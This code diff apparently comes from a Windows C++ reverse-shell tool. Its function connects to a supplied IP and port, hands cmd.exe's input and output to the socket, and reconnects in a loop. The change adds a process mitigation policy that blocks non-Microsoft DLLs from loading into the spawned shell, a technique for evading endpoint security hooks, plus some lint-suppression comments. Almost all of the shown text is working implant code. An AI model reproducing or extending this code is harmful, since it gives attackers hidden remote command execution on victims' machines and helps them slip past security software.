@@ -5,6 +5,7 @@
 #pragma comment(lib, "Ws2_32.lib")
 constexpr auto default_buffer_length = 1024;
 
+// ReSharper disable once CppParameterMayBeConst
 void shell(wchar_t* ip, int port)
 {
     while (true) {
@@ -27,7 +28,7 @@ void shell(wchar_t* ip, int port)
         sockaddr_in address{};
         address.sin_family = AF_INET;
         InetPton(AF_INET, ip, &address.sin_addr.s_addr);
-        address.sin_port = htons(port);
+        address.sin_port = htons(port);  // NOLINT(clang-diagnostic-implicit-int-conversion)
 
         if (WSAConnect(my_socket, reinterpret_cast<SOCKADDR*>(&address), sizeof(address), nullptr, nullptr, nullptr, nullptr) == SOCKET_ERROR) {
             closesocket(my_socket);
@@ -44,15 +45,27 @@ void shell(wchar_t* ip, int port)
             continue;
         }
 
-        wchar_t command_line[8] = L"cmd.exe";
-        STARTUPINFO si;
+        STARTUPINFOEXA si;
         PROCESS_INFORMATION pi;
-        memset(&si, 0, sizeof(si));
-        si.cb = sizeof(si);
-        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-        si.hStdInput = si.hStdOutput = si.hStdError = reinterpret_cast<HANDLE>(my_socket);
+        ZeroMemory(&si, sizeof(si));
+        si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+        si.StartupInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW | EXTENDED_STARTUPINFO_PRESENT);
+        si.StartupInfo.hStdInput = si.StartupInfo.hStdOutput = si.StartupInfo.hStdError = reinterpret_cast<HANDLE>(my_socket);
 
-        CreateProcess(nullptr, command_line, nullptr, nullptr, TRUE, 0, nullptr, nullptr, &si, &pi);
+        SIZE_T size = 0;
+        InitializeProcThreadAttributeList(nullptr, 1, 0, &size);
+        si.lpAttributeList = static_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(HeapAlloc(
+	        GetProcessHeap(),
+	        0,
+	        size
+        ));
+
+        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
+        DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+        UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), nullptr, nullptr);
+
+        // ReSharper disable once CppFunctionalStyleCast
+        CreateProcessA(nullptr, LPSTR(R"(C:\Windows\System32\cmd.exe)"), nullptr, nullptr, TRUE, 0, nullptr, nullptr, reinterpret_cast<LPSTARTUPINFOA>(&si), &pi);
         WaitForSingleObject(pi.hProcess, INFINITE);
 
         CloseHandle(pi.hProcess);
@@ -60,7 +73,6 @@ void shell(wchar_t* ip, int port)
 
         memset(receive_data, 0, sizeof(receive_data));
         receive_code = recv(my_socket, receive_data, default_buffer_length, 0);
-
         if (receive_code <= 0) {
             closesocket(my_socket);
             WSACleanup();
